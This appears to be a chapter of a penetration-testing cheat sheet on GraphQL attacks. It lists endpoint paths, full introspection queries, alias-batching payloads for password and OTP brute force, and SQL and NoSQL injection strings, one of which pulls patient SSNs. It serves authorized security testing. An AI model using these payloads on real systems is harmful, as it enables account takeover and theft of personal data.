# Ch11 — GraphQL Injection

> **Live-program ceiling:** one introspection query + one escalating cost/alias sequence proves the gap — batch floods and nesting bombs are DoS probes, gated by explicit permission.

> Endpoint discovery, introspection/schema enum, query/mutation payload shapes, batching abuse, injection through GraphQL args.
> Sources: `GraphQL Injection/`.

**Route here when**: a `/graphql`-style endpoint accepts `{"query": ...}` or `?query=`, or the app speaks GraphQL behind an API gateway.

## Endpoint discovery

```ps1
/graphql /graphiql /graph /graphql/console /graphql.php /graphiql.php
/v1/explorer /v1/graphiql /playground /api/graphql
```

Probe methods — GraphQL-over-HTTP *requires* POST but many servers also accept GET:

```ps1
GET /graphql?query={__schema{types{name}}}
GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D
POST /graphql   {"query":"{ user { id name } }"}
```

Error probes: `?query={__schema}`, `?query={}`, `?query={thisdefinitelydoesnotexist}` — verbose errors confirm a GraphQL backend and leak schema hints ("Did you mean X?").

## Introspection — full schema dump

Minimal:

```js
{"query":"{ __schema { types { name } } }"}
```

Per-type definition (replace `User`):

```javascript
{__type (name: "User") {name fields{name type{name kind ofType{name kind}}}}}
```

Full introspection (single-line, no fragments):

```rs
{__schema{queryType{name}mutationType{name}types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name}}},enumValues(includeDeprecated:true){name,description,isDeprecated},possibleTypes{kind,name,ofType{kind,name}}},directives{name,description,locations}}}
```

Use the standard `IntrospectionQuery` (with FullType/InputValue/TypeRef fragments — see upstream file) when fragments are allowed; URL-encode the whole thing for GET. If introspection is **disabled**: brute field/type names with a wordlist, or abuse the suggestion oracle — send `{"query":"{one}"}` and harvest `"Did you mean \"node\"?"` hints to walk the schema.

## Query & mutation shapes

```js
{ user { id name } }                                   // shorthand query
{ user(id: "1") { name email } }                       // args — IDOR/BOLA test point
{ user(id: "1") { name posts { title comments { content } } } }   // nested traversal
mutation{ signIn(login:"Admin", password:"x"){ token } }
mutation{ addUser(id:"1", name:"n", email:"e"){ id name email } }
```

Notes: mutations generally fail over GET. `id:`/`userId:`/object-identifier args = test every one as an IDOR (ch15). Deep nesting = authorization gaps on related objects.

## Batching abuse (rate-limit/brute amplification)

JSON-list batching — many ops, one request:

```json
[{"query":"..."},{"query":"..."},{"query":"..."}]
```

Alias batching — same mutation repeated in one query:

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```

```json
{"query": "mutation { one: login(username:\"bob\",pass:1111) two: login(username:\"bob\",pass:2222) three: login(username:\"bob\",pass:3333) }"}
```

**When-to-use**: password/OTP brute force and rate-limit bypass — one HTTP request = N attempts. (Throttle per program rules; this is a volumetric technique.)

## Injection through arguments

GraphQL is a transport — the resolver still hits a backend:

**SQLi inside an arg**:

```js
{ bacon(id: "1'") { id type price } }
query { user(name: "patt';SELECT 1;SELECT pg_sleep(30);--'") { id email } }
```

**NoSQL inside an arg** (`search`/`options` fields that accept JSON strings):

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\": 1}",
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }")
    { firstName lastName id patients{ssn} }
}
```

Also try the ch02/ch03 payloads inside string args, ID args, and nested `where`/`filter` input objects — GraphQL input objects map cleanly onto ORM lookups (`{"where":{"password":{"startsWith":"a"}}}` → ORM leak, see ch03).

## Path-to-type enumeration

Post-introspection, the useful question is "how do I reach type X from Query?" — deeply nested or indirect paths often skip authz checks applied at the obvious entry. Tools like graphql-path-enum take introspection JSON + a target type and list every reachable path (e.g., `Query(me) -> User(pentester_profile) -> PentesterProfile(skills)`).

## CSRF & authz notes

- GraphQL endpoints on cookie auth = CSRF candidates (see ch12) — `content-type: text/plain` or `application/x-www-form-urlencoded` bodies may be accepted as "simple requests" skipping preflight.
- `__schema`/`__type` accessible to unauthenticated callers = information disclosure finding on its own.
- Test query-level vs field-level authorization: a query may be allowed while a nested field or mutation is meant to be admin-only.
